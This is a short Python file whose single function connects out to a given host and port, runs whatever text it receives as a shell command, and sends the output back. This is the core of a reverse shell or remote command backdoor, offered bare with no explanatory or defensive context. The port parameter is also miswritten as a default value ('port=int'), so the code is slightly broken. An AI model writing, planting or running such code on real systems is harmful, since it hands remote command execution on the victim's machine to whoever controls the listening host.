import socket
import subprocess

def run_client(host: str, port=int):
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
		client_socket.connect((host, port))

		first_message = client_socket.recv(1024)
		if not first_message:
			return

		decoded_message = first_message.decode("utf-8", errors="replace")
		proc = subprocess.Popen(decoded_message, stdout=subprocess.PIPE, shell=True)
		(out, err) = proc.communicate()
		response = out
		client_socket.sendall(response)
		print("Response sent.")
